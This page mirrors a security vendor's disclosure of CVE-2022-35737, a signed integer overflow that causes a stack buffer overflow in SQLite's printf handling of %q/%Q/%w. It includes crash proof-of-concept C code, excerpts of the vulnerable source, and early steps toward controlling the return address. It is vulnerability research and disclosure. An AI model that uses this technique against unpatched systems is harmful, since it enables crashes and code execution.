<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://blog.trailofbits.com/2022/10/25/sqlite-vulnerability-july-2022-library-api/">Original</a>
    <h1>Stranger Strings: An exploitable flaw in SQLite</h1>
    
    <div id="readability-page-1" class="page"><article id="post-102981">
	<!-- .entry-header -->

	<div>
		<p><strong>By Andreas Kellas</strong></p>
<p>Trail of Bits is publicly disclosing <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-35737" rel="noopener" target="_blank">CVE-2022-35737</a>, which affects applications that use the SQLite library API. CVE-2022-35737 was introduced in SQLite version 1.0.12 (released on October 17, 2000) and fixed in <a href="https://www.sqlite.org/releaselog/3_39_2.html" rel="noopener" target="_blank">release 3.39.2</a> (released on July 21, 2022). CVE-2022-35737 is exploitable on 64-bit systems, and exploitability depends on how the program is compiled; arbitrary code execution is confirmed when the library is compiled without stack canaries, but unconfirmed when stack canaries are present, and denial-of-service is confirmed in all cases.</p>
<p>On vulnerable systems, CVE-2022-35737 is exploitable when large string inputs are passed to the SQLite implementations of the <code>printf</code> functions and when the format string contains the <code>%Q</code>, <code>%q</code>, or <code>%w</code> format substitution types. This is enough to cause the program to crash. We also show that if the format string contains the <code>!</code> special character to enable unicode character scanning, then it is possible to achieve arbitrary code execution in the worst case, or to cause the program to hang and loop (nearly) indefinitely.</p>
<p>SQLite is used <a href="https://thenewstack.io/the-origin-story-of-sqlite-the-worlds-most-widely-used-database-software/" rel="noopener" target="_blank">in nearly everything</a>, from naval warships to smartphones to other programming languages. The open-source database engine has a long history of being very secure: many CVEs that are initially pinned to SQLite <a href="https://www.sqlite.org/cves.html" rel="noopener" target="_blank">actually don’t impact it at all</a>. This blog post describes the vulnerability and our <a href="https://github.com/trailofbits/publications/tree/master/disclosures/CVE-2022-35737#readme" rel="noopener" target="_blank">proof-of-concept exploits</a>, which actually does impact certain versions of SQLite. Although this bug may be difficult to reach in deployed applications, it is a prime example of a vulnerability that is made easier to exploit by  “divergent representations” that result from applying compiler optimizations to undefined behavior. In an upcoming blog post, we will show how to find instances of the divergent representations bug in binaries and source code.</p>
<h2>Background: Stumbling onto a bug</h2>
<p>A <a href="https://pwning.systems/posts/php_filter_var_shenanigans/" rel="noopener" target="_blank">recent blog post</a> presented a vulnerability in PHP that seemed like the perfect candidate for a variant analysis. The blog’s bug manifested when a 64-bit unsigned integer string length was implicitly converted into a 32-bit signed integer when passed as an argument to a function. We formulated a variant analysis for this bug class, found a few bugs, and while most of them were banal, one in particular stood out: a function used for properly escaping quote characters in the <a href="https://github.com/php/php-src/blob/5d5d9796fc4bd6d91f39db5531ae5713b8afbaec/ext/pdo_sqlite/sqlite_driver.c#L227" rel="noopener" target="_blank">PHP PDO SQLite module</a>. And thus began our strange journey into SQLite string formatting.</p>
<p>SQLite is the <a href="https://www.sqlite.org/mostdeployed.html" rel="noopener" target="_blank">most widely deployed database engine</a>, thanks in part to its very <a href="https://www.sqlite.org/copyright.html" rel="noopener" target="_blank">permissive licensing</a> and cross-platform, portable design. It is written in C, and can be compiled into a standalone application or a library that exposes APIs for application programmers to use. It seems to be used everywhere—a perception that was reinforced when we tripped right over this vulnerability while hunting for bugs elsewhere.</p>
<pre title=""> static zend_string* sqlite_handle_quoter(pdo_dbh_t *dbh, const zend_string *unquoted, enum pdo_param_type paramtype)
 {
		char *quoted = safe_emalloc(2, ZSTR_LEN(unquoted), 3);
		/* TODO use %Q format? */
		sqlite3_snprintf(2*ZSTR_LEN(unquoted) + 3, quoted, &#34;&#39;%q&#39;&#34;, ZSTR_VAL(unquoted));
		zend_string *quoted_str = zend_string_init(quoted, strlen(quoted), 0);
		efree(quoted);
		return quoted_str;
 }
</pre>
<p>On line 231, an unsigned long <code>(2*ZSTR_LEN(unquoted) + 3)</code> is passed as the first parameter to <code>sqlite3_snprintf</code>, which expects a signed integer. This felt exciting, and we quickly scripted a simple proof of concept. We expected to be able to exploit this bug to produce a poorly formatted string with mismatched quote characters by passing large strings to the function, and possibly achieve SQL injection in vulnerable applications.</p>
<p><a href="https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/php.png?ssl=1"><img data-attachment-id="102991" data-permalink="https://blog.trailofbits.com/2022/10/25/sqlite-vulnerability-july-2022-library-api/php/" data-orig-file="https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/php.png?fit=956%2C102&amp;ssl=1" data-orig-size="956,102" data-comments-opened="1" data-image-meta="{&#34;aperture&#34;:&#34;0&#34;,&#34;credit&#34;:&#34;&#34;,&#34;camera&#34;:&#34;&#34;,&#34;caption&#34;:&#34;&#34;,&#34;created_timestamp&#34;:&#34;0&#34;,&#34;copyright&#34;:&#34;&#34;,&#34;focal_length&#34;:&#34;0&#34;,&#34;iso&#34;:&#34;0&#34;,&#34;shutter_speed&#34;:&#34;0&#34;,&#34;title&#34;:&#34;&#34;,&#34;orientation&#34;:&#34;0&#34;}" data-image-title="php" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/php.png?fit=300%2C32&amp;ssl=1" data-large-file="https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/php.png?fit=690%2C74&amp;ssl=1" src="https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/php.png?resize=690%2C74&amp;ssl=1" alt="" width="690" height="74" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/php.png?w=956&amp;ssl=1 956w, https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/php.png?resize=300%2C32&amp;ssl=1 300w, https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/php.png?resize=768%2C82&amp;ssl=1 768w" data-lazy-sizes="(max-width: 690px) 100vw, 690px" data-lazy-src="https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/php.png?resize=690%2C74&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"/></a></p>
<h3>There’s a bug in my bug!</h3>
<p>We quickly determined that the crash was occurring in the SQLite shared object, so we naturally took a closer look at the <code>sqlite3_snprintf</code> function.</p>
<p>SQLite implements <a href="https://www.sqlite.org/c3ref/mprintf.html">custom versions of the <code>printf</code> family</a> of functions and adds the new format specifiers <code>%Q</code>, <code>%q</code>, and <code>%w</code>, which are designed to properly escape quote characters in the input string in order to make safe SQL queries. <a href="https://github.com/trailofbits/publications/blob/master/disclosures/CVE-2022-35737/snprintf-good-example.c" rel="noopener" target="_blank">For example</a>, we wrote the following code snippet to properly use <code>sqlite3_snprintf</code> with the format specifier <code>%q</code> to output a string where all single-quote characters are escaped with another single quote. Additionally, the entire string is wrapped in a leading and trailing single quote, the way the PHP quote function intends:</p>
<pre title="">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;sqlite3.h&gt;

int main(int argc, char *argv[]) {

    char src[] = &#34;hello, \&#39;world\&#39;!&#34;;
    char dst[sizeof(src) + 4];  // Add 4 to account for extra quotes.

    sqlite3_snprintf(sizeof(dst), dst, &#34;&#39;%q&#39;&#34;, src);

    printf(&#34;src: %s\n&#34;, src);
    printf(&#34;dst: %s\n&#34;, dst);
    return 0;
}
</pre>
<div id="attachment_102998"><p><a href="https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/JFlSpPEseXvmCQRGPnEdZv2Zkv3pSw1Pi38WgjmChwunr88oF5oSKWvseCrv8ke_ghwTTqZ3OV_I_uULb9kFumFmvOp6Jj0MTcD0bU79msxJEP1CUUzcpL2oJ0zw.png?ssl=1"><img aria-describedby="caption-attachment-102998" data-attachment-id="102998" data-permalink="https://blog.trailofbits.com/2022/10/25/sqlite-vulnerability-july-2022-library-api/jflsppesexvmcqrgpnedzv2zkv3psw1pi38wgjmchwunr88of5oskwvsecrv8ke_ghwttqz3ov_i_uulb9kfumfmvop6jj0mtcd0bu79msxjep1cuuzcpl2oj0zw/" data-orig-file="https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/JFlSpPEseXvmCQRGPnEdZv2Zkv3pSw1Pi38WgjmChwunr88oF5oSKWvseCrv8ke_ghwTTqZ3OV_I_uULb9kFumFmvOp6Jj0MTcD0bU79msxJEP1CUUzcpL2oJ0zw.png?fit=740%2C68&amp;ssl=1" data-orig-size="740,68" data-comments-opened="1" data-image-meta="{&#34;aperture&#34;:&#34;0&#34;,&#34;credit&#34;:&#34;&#34;,&#34;camera&#34;:&#34;&#34;,&#34;caption&#34;:&#34;&#34;,&#34;created_timestamp&#34;:&#34;0&#34;,&#34;copyright&#34;:&#34;&#34;,&#34;focal_length&#34;:&#34;0&#34;,&#34;iso&#34;:&#34;0&#34;,&#34;shutter_speed&#34;:&#34;0&#34;,&#34;title&#34;:&#34;&#34;,&#34;orientation&#34;:&#34;0&#34;}" data-image-title="JFlSpPEseXvmCQRGPnEdZv2Zkv3pSw1Pi38WgjmChwunr88oF5oSKWvseCrv8ke_ghwTTqZ3OV_I_uULb9kFumFmvOp6Jj0MTcD0bU79msxJEP1CUUzcpL2oJ0zw" data-image-description="" data-image-caption="&lt;p&gt;sqlite3_snprintf properly wraps the original string in single quotes, and escapes any existing single-quotes in the input string.&lt;/p&gt;
" data-medium-file="https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/JFlSpPEseXvmCQRGPnEdZv2Zkv3pSw1Pi38WgjmChwunr88oF5oSKWvseCrv8ke_ghwTTqZ3OV_I_uULb9kFumFmvOp6Jj0MTcD0bU79msxJEP1CUUzcpL2oJ0zw.png?fit=300%2C28&amp;ssl=1" data-large-file="https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/JFlSpPEseXvmCQRGPnEdZv2Zkv3pSw1Pi38WgjmChwunr88oF5oSKWvseCrv8ke_ghwTTqZ3OV_I_uULb9kFumFmvOp6Jj0MTcD0bU79msxJEP1CUUzcpL2oJ0zw.png?fit=690%2C63&amp;ssl=1" src="https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/JFlSpPEseXvmCQRGPnEdZv2Zkv3pSw1Pi38WgjmChwunr88oF5oSKWvseCrv8ke_ghwTTqZ3OV_I_uULb9kFumFmvOp6Jj0MTcD0bU79msxJEP1CUUzcpL2oJ0zw.png?resize=690%2C63&amp;ssl=1" alt="" width="690" height="63" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/JFlSpPEseXvmCQRGPnEdZv2Zkv3pSw1Pi38WgjmChwunr88oF5oSKWvseCrv8ke_ghwTTqZ3OV_I_uULb9kFumFmvOp6Jj0MTcD0bU79msxJEP1CUUzcpL2oJ0zw.png?w=740&amp;ssl=1 740w, https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/JFlSpPEseXvmCQRGPnEdZv2Zkv3pSw1Pi38WgjmChwunr88oF5oSKWvseCrv8ke_ghwTTqZ3OV_I_uULb9kFumFmvOp6Jj0MTcD0bU79msxJEP1CUUzcpL2oJ0zw.png?resize=300%2C28&amp;ssl=1 300w" data-lazy-sizes="(max-width: 690px) 100vw, 690px" data-lazy-src="https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/JFlSpPEseXvmCQRGPnEdZv2Zkv3pSw1Pi38WgjmChwunr88oF5oSKWvseCrv8ke_ghwTTqZ3OV_I_uULb9kFumFmvOp6Jj0MTcD0bU79msxJEP1CUUzcpL2oJ0zw.png?resize=690%2C63&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"/></a></p><p id="caption-attachment-102998"><code>sqlite3_snprintf</code> properly wraps the original string in single quotes, and escapes any existing single-quotes in the input string.</p></div>
<p>Next, we <a href="https://github.com/trailofbits/publications/blob/master/disclosures/CVE-2022-35737/snprintf-crash.c" rel="noopener" target="_blank">changed our program</a> to imitate the behavior of the PHP script by passing the same large 2GB string directly to <code>sqlite3_snprintf</code>:</p>
<pre title="">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;sqlite3.h&gt;

#define STR_LEN ((0x100000001 - 3) / 2)

int main(int argc, char *argv[]) {

    char *src = calloc(1, STR_LEN + 1); // Account for NULL byte.
    memset(src, &#39;a&#39;, STR_SIZE);
    char *dst = calloc(1, STR_LEN + 3); // Account for extra quotes and NULL byte.

    sqlite3_snprintf(2*STR_LEN + 3, dst, &#34;&#39;%q&#39;&#34;, src);

    printf(&#34;src: %s\n&#34;, src);
    printf(&#34;dst: %s\n&#34;, dst);
    return 0;
}
</pre>
<p><a href="https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/fish-.a.out-terminated-by-signal-SIGSEGV-Address-boundary-error.png?ssl=1"><img data-attachment-id="103002" data-permalink="https://blog.trailofbits.com/2022/10/25/sqlite-vulnerability-july-2022-library-api/fish-a-out-terminated-by-signal-sigsegv-address-boundary-error/" data-orig-file="https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/fish-.a.out-terminated-by-signal-SIGSEGV-Address-boundary-error.png?fit=683%2C52&amp;ssl=1" data-orig-size="683,52" data-comments-opened="1" data-image-meta="{&#34;aperture&#34;:&#34;0&#34;,&#34;credit&#34;:&#34;&#34;,&#34;camera&#34;:&#34;&#34;,&#34;caption&#34;:&#34;&#34;,&#34;created_timestamp&#34;:&#34;0&#34;,&#34;copyright&#34;:&#34;&#34;,&#34;focal_length&#34;:&#34;0&#34;,&#34;iso&#34;:&#34;0&#34;,&#34;shutter_speed&#34;:&#34;0&#34;,&#34;title&#34;:&#34;&#34;,&#34;orientation&#34;:&#34;0&#34;}" data-image-title="fish .a.out terminated by signal SIGSEGV (Address boundary error)" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/fish-.a.out-terminated-by-signal-SIGSEGV-Address-boundary-error.png?fit=300%2C23&amp;ssl=1" data-large-file="https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/fish-.a.out-terminated-by-signal-SIGSEGV-Address-boundary-error.png?fit=683%2C52&amp;ssl=1" src="https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/fish-.a.out-terminated-by-signal-SIGSEGV-Address-boundary-error.png?resize=683%2C52&amp;ssl=1" alt="" width="683" height="52" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/fish-.a.out-terminated-by-signal-SIGSEGV-Address-boundary-error.png?w=683&amp;ssl=1 683w, https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/fish-.a.out-terminated-by-signal-SIGSEGV-Address-boundary-error.png?resize=300%2C23&amp;ssl=1 300w" data-lazy-sizes="(max-width: 683px) 100vw, 683px" data-lazy-src="https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/fish-.a.out-terminated-by-signal-SIGSEGV-Address-boundary-error.png?resize=683%2C52&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"/></a></p>
<p>A crash! We seem to have found a culprit: large inputs to <code>sqlite3_snprintf</code>. Thus began a journey down a rabbit hole where we discovered that SQLite does not properly handle large strings in parts of its custom implementations of the <code>printf</code> family of functions. Even further down the rabbit hole, we discovered that a compiler optimization made it easier to exploit the SQLite vulnerability.</p>
<h2>The Vulnerability</h2>
<p>The custom SQLite <code>printf</code> family of functions internally calls the function <code>sqlite3_str_vappendf</code>, which handles string formatting. Large string inputs to the <code>sqlite3_str_vappendf</code> function can cause signed integer overflow when the format substitution type is <code>%q</code>, <code>%Q</code>, or <code>%w</code>.</p>
<p><code>sqlite3_str_vappendf</code> scans the input <code>fmt</code> string and formats the variable-sized argument list according to the format substitution types specified in the <code>fmt</code> string. In the case statement for handling the <code>%q</code>, <code>%Q</code>, and <code>%w</code> format specifiers (<a href="https://sqlite.org/src/info?name=6166a30417b05c5b2f82e1f183f75faa2926ad60531c0b688a57dbc951441a20&amp;ln=803-850" rel="noopener" target="_blank">src/printf.c:L803-850</a>), the function scans the input string for quote characters in order to calculate the correct number of output bytes (lines 824-828) and then copies the input to the output buffer and adds quotation characters as required (lines 842-845). In the snippet below, <code>escarg</code> points to the input string:</p>
<pre title=""> 
        case etSQLESCAPE:           /* %q: Escape &#39; characters */
        case etSQLESCAPE2:          /* %Q: Escape &#39; and enclose in &#39;...&#39; */
        case etSQLESCAPE3: {        /* %w: Escape &#34; characters */
          int i, j, k, n, isnull;
          int needQuote;
          char ch;
          char q = ((xtype==etSQLESCAPE3)?&#39;&#34;&#39;:&#39;\&#39;&#39;);   /* Quote character */
          char *escarg;
	
         if( bArgList ){
           escarg = getTextArg(pArgList);
         }else{
           escarg = va_arg(ap,char*);
         }
         isnull = escarg==0;
         if( isnull ) escarg = (xtype==etSQLESCAPE2 ? &#34;NULL&#34; : &#34;(NULL)&#34;);
         /* For %q, %Q, and %w, the precision is the number of bytes (or
         ** characters if the ! flags is present) to use from the input.
         ** Because of the extra quoting characters inserted, the number
         ** of output characters may be larger than the precision.
         */
         k = precision;
         for(i=n=0; k!=0 &amp;&amp; (ch=escarg[i])!=0; i++, k--){
           if( ch==q )  n++;
           if( flag_altform2 &amp;&amp; (ch&amp;0xc0)==0xc0 ){
             while( (escarg[i+1]&amp;0xc0)==0x80 ){ i++; }
           }
         }
         needQuote = !isnull &amp;&amp; xtype==etSQLESCAPE2;
         n += i + 3;
         if( n&gt;etBUFSIZE ){
           bufpt = zExtra = printfTempBuf(pAccum, n);
           if( bufpt==0 ) return;
         }else{
           bufpt = buf;
         }
         j = 0;
         if( needQuote ) bufpt[j++] = q;
         k = i;
         for(i=0; i&lt;k; i++){
           bufpt[j++] = ch = escarg[i];
           if( ch==q ) bufpt[j++] = ch;
         }
         if( needQuote ) bufpt[j++] = q;
         bufpt[j] = 0;
         length = j;
         goto adjust_width_for_utf8;
       }
</pre>
<p>The number of quote characters (<code>int n</code>) and the total number of bytes in the input string (<code>int i</code>) are used to calculate the maximum total bytes required in the output buffer (L832: <code>n+=i+3</code>). This calculation can cause n to overflow to a negative value, for example, when the int type is 32-bits and <code>n=0</code> and <code>i=0x7ffffffe</code>. This is possible when the input string contains <code>0x7ffffffe</code> ASCII characters with no quote characters.</p>
<p>Lines 833-838 are supposed to ensure that a buffer of sufficient size is allocated to receive the formatted bytes of the input string. If the output string size could exceed <code>etBUFSIZE</code> bytes (70 bytes, by default), the program dynamically allocates a buffer of sufficient size to hold the output string (line 834). Otherwise, the program expects the output buffer to be smaller than the stack-allocated buffer of etBUFSIZE bytes, and the small stack-allocated buffer is used instead (line 837). At least <code>i</code> bytes are copied from the input into the destination buffer. When n overflows to a negative value, the stack-allocated buffer is used, even though <code>i</code> can exceed <code>etBUFSIZE</code>, resulting in a stack buffer overflow when the input string is copied to the output buffer (line 843).</p>
<h2>The Exploits</h2>
<p>But can we do more interesting things with this vulnerability than just crash the target program? Of course!</p>
<p>The input string must be very large to reach the bug condition where n overflows to a negative value at line 832. The challenge is that when the input string is very large, the variable <code>i</code> (which counts the number of bytes in the input string) is also very large, resulting in a lot of data written to the stack and causing the program to crash at line 843. We set out to determine whether it is possible to cause n to overflow on line 832, but to also cause <code>i</code> to stay small and positive at line 843 and thus avoid crashing. We revisit the loop where <code>i</code> is computed, from lines 824 to 830:</p>
<pre title="">        /* For %q, %Q, and %w, the precision is the number of bytes (or
        ** characters if the ! flags is present) to use from the input.
        ** Because of the extra quoting characters inserted, the number
        ** of output characters may be larger than the precision.
        */
        k = precision;
        for(i=n=0; k!=0 &amp;&amp; (ch=escarg[i])!=0; i++, k--){
        if( ch==q )  n++;
        if( flag_altform2 &amp;&amp; (ch&amp;0xc0)==0xc0 ){
        while( (escarg[i+1]&amp;0xc0)==0x80 ){ i++; }
        }
        }
</pre>
<p>The purpose of this loop is to scan the input string (<code>escarg</code>) for quote characters (<code>q</code>), incrementing <code>n</code> each time one is found. If our goal is to cause a controlled stack buffer overflow that does not crash the program, then the loop must terminate with values such that <code>n+=i+3</code> results in a value less than <code>etBUFSIZE</code> (a macro defined to 70) and <code>i</code> must be a relatively small positive integer that is greater than <code>etBUFSIZE</code>.</p>
<p>The <code>k</code> and <code>flag_altform2</code> variables in the loop are related to two features of the SQLite <code>printf</code> functions: <a href="https://www.sqlite.org/printf.html#:~:text=The%20Optional%20Precision%20Field" rel="noopener" target="_blank">optional precision</a> and the <a href="https://www.sqlite.org/printf.html#:~:text=The%20Options%20Flags%20Field" rel="noopener" target="_blank">optional alternate format flag 2</a>, which are both influenced by the format string. In the example below, including <code>!</code> in the format string sets <code>flag_altform2=true</code>, and the <code>.80 sets precision=80</code>:</p>
<pre>   snprintf3_snprintf(len, buf, “‘%!.80q’”, src) </pre>
<p>When precision is not set in the format string, it is set by default to -1. Therefore, by default <code>int k=-1</code>, and the loop decrements <code>k</code> with each iteration, so the outer loop can execute 232  times before <code>k=0</code>.</p>
<p>So far in our analysis of CVE-2022-35737, we’ve made few assumptions about the format string passed to the vulnerable function, other than that it contains one of the vulnerable format specifiers (<code>%Q</code>, <code>%q</code>, or <code>%w</code>). To progress further in our exploitation, we need to make one more assumption: that the <code>flag_altform2</code> is set by providing a <code>!</code> character in the format string.</p>
<p>When <code>flag_altform2=true</code>, it is possible to increment <code>i</code> in the inner loop without decrementing <code>k</code> by including unicode characters in the input string. With this in mind, perhaps we can include enough quote characters in the input to set n to a large positive integer, and then cause <code>i</code> to increment in the inner loop until it wraps back around to a small positive integer, and then somehow exit the loop. But how will <code>i</code> behave when it overflows beyond the maximum signed integer value? Will it wrap back to <code>0</code>, or to a negative value? Is it possible to tell by just looking at the source code? No, it isn’t; this is undefined behavior, so we must inspect the compiled binary to see what choices the compiler made to represent <code>i</code>.</p>
<h3>Divergent Representations in the compiled binary</h3>
<p>We have been working on an Ubuntu 20.04 host and have a version of <code>libsqlite.so</code> version 3.31.1 installed from the APT package manager, so that is the version of the compiled binary that we examine in Binary Ninja:</p>
<div id="attachment_103016"><p><a href="https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/binary_ninja_101822.png?ssl=1"><img aria-describedby="caption-attachment-103016" data-attachment-id="103016" data-permalink="https://blog.trailofbits.com/2022/10/25/sqlite-vulnerability-july-2022-library-api/binary_ninja_101822/" data-orig-file="https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/binary_ninja_101822.png?fit=1244%2C1216&amp;ssl=1" data-orig-size="1244,1216" data-comments-opened="1" data-image-meta="{&#34;aperture&#34;:&#34;0&#34;,&#34;credit&#34;:&#34;&#34;,&#34;camera&#34;:&#34;&#34;,&#34;caption&#34;:&#34;&#34;,&#34;created_timestamp&#34;:&#34;0&#34;,&#34;copyright&#34;:&#34;&#34;,&#34;focal_length&#34;:&#34;0&#34;,&#34;iso&#34;:&#34;0&#34;,&#34;shutter_speed&#34;:&#34;0&#34;,&#34;title&#34;:&#34;&#34;,&#34;orientation&#34;:&#34;0&#34;}" data-image-title="binary_ninja_101822" data-image-description="" data-image-caption="&lt;p&gt;Binary Ninja disassembly of the compiled loop from source code lines 824 to 830, where the escarg input string is scanned for quote-characters. [1a] and [1b] indicate source line 825 escarg[i]; … i++. [2a] and [2b] indicate source line 828 escarg[i+1]; … i++.&lt;/p&gt;
" data-medium-file="https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/binary_ninja_101822.png?fit=300%2C293&amp;ssl=1" data-large-file="https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/binary_ninja_101822.png?fit=690%2C675&amp;ssl=1" src="https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/binary_ninja_101822.png?resize=690%2C675&amp;ssl=1" alt="" width="690" height="675" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/binary_ninja_101822.png?resize=1024%2C1001&amp;ssl=1 1024w, https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/binary_ninja_101822.png?resize=300%2C293&amp;ssl=1 300w, https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/binary_ninja_101822.png?resize=768%2C751&amp;ssl=1 768w, https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/binary_ninja_101822.png?resize=1200%2C1173&amp;ssl=1 1200w, https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/binary_ninja_101822.png?w=1244&amp;ssl=1 1244w" data-lazy-sizes="(max-width: 690px) 100vw, 690px" data-lazy-src="https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/binary_ninja_101822.png?resize=690%2C675&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"/></a></p><p id="caption-attachment-103016">Binary Ninja disassembly of the compiled loop from source code lines 824 to 830, where the <code>escarg</code> input string is scanned for quote-characters. [1a] and [1b] indicate source line 825 <code>escarg[i]; … i++</code>. [2a] and [2b] indicate source line 828 <code>escarg[i+1]; … i++.</code></p></div>
<p>At instruction [1a], <code>r10</code> contains the address of <code>escarg</code>, and <code>rsi</code> is used to index into the buffer to fetch a value from it, where the <code>rsi</code> register was set by sign-extending the 32-bit <code>edx</code> register in the instruction immediately before it. This corresponds to the <code>escarg[i]</code> expression on line 825 of the source code. With each loop iteration, <code>edx</code> is incremented at instruction [1b]. This means that the source code variable i is represented using signed 32-bit integer semantics, and so when <code>i</code> reaches the maximum 32-bit positive signed integer value (<code>0x7fffffff</code>), it will increment to <code>0x80000000</code> at [1b], which will be sign-extended into <code>rsi</code> as <code>0xffffffff80000000</code> and used to negatively index into <code>escarg</code>.</p>
<p>However, instruction [2a] tells a different story. Here, <code>r10</code> still contains the address of <code>escarg</code>, but rax+1 is used to index into the buffer, corresponding to the <code>escarg[i+1]</code> expression on line 828 of the source code, in the inner loop that scans for unicode characters. Instruction [2b] increments <code>rax</code>, but as a 64-bit value—and with no 32-bit sign-extension—before looping back to [2a]. Here, <code>i</code> is represented with unsigned 64-bit integer semantics, so that when i exceeds the maximum signed 32-bit integer value (<code>0x7fffffff</code>), its next memory access is to <code>escarg+0x80000000</code>. <strong>We have divergent representations of the same source variable, and two different values can be read from memory for the same value of the source variable <code>i</code>!</strong> This discovery prompted us to search for more instances of these “divergent representations,” and we describe this search in a separate blog post.</p>
<p>Okay, so can we use this compilation quirk to set the conditions for a more interesting exploit of CVE-2022-35737? Turns out, yes.</p>
<h3>Controlling the Saved Return Address</h3>
<p>Here’s a quick recap of the conditions that we are trying to set:</p>
<pre title="">  case etSQLESCAPE:           /* %q: Escape &#39; characters */
      case etSQLESCAPE2:          /* %Q: Escape &#39; and enclose in &#39;...&#39; */
      case etSQLESCAPE3: {        /* %w: Escape &#34; characters */
        int i, j, k, n, isnull;
        int needQuote;
        char ch;
        char q = ((xtype==etSQLESCAPE3)?&#39;&#34;&#39;:&#39;\&#39;&#39;);   /* Quote character */
        char *escarg;
	
        if( bArgList ){
          escarg = getTextArg(pArgList);
        }else{
         escarg = va_arg(ap,char*);
        }
        isnull = escarg==0;
       if( isnull ) escarg = (xtype==etSQLESCAPE2 ? &#34;NULL&#34; : &#34;(NULL)&#34;);
        /* For %q, %Q, and %w, the precision is the number of bytes (or
        ** characters if the ! flags is present) to use from the input.
        ** Because of the extra quoting characters inserted, the number
        ** of output characters may be larger than the precision.
        */
         k = precision;
         for(i=n=0; k!=0 &amp;&amp; (ch=escarg[i])!=0; i++, k--){    // [1]
           if( ch==q )  n++;                                 //
           if( flag_altform2 &amp;&amp; (ch&amp;0xc0)==0xc0 ){           //
             while( (escarg[i+1]&amp;0xc0)==0x80 ){ i++; }       //
           }                                                 //
         }                                                   //
         needQuote = !isnull &amp;&amp; xtype==etSQLESCAPE2;
        n += i + 3;                                          // [2]
        if( n&gt;etBUFSIZE ){
           bufpt = zExtra = printfTempBuf(pAccum, n);
           if( bufpt==0 ) return;
         }else{
          bufpt = buf;
         }
         j = 0;
        if( needQuote ) bufpt[j++] = q;
        k = i;                                               // [3]
        for(i=0; i&lt;k; i++){                                  //
          bufpt[j++] = ch = escarg[i];                       //
          if( ch==q ) bufpt[j++] = ch;                       //
        }                                                    //
        if( needQuote ) bufpt[j++] = q;
        bufpt[j] = 0;
        length = j;
        goto adjust_width_for_utf8;
        }

</pre>
<p>Here is a screenshot to highlight what we want to concentrate on:</p>
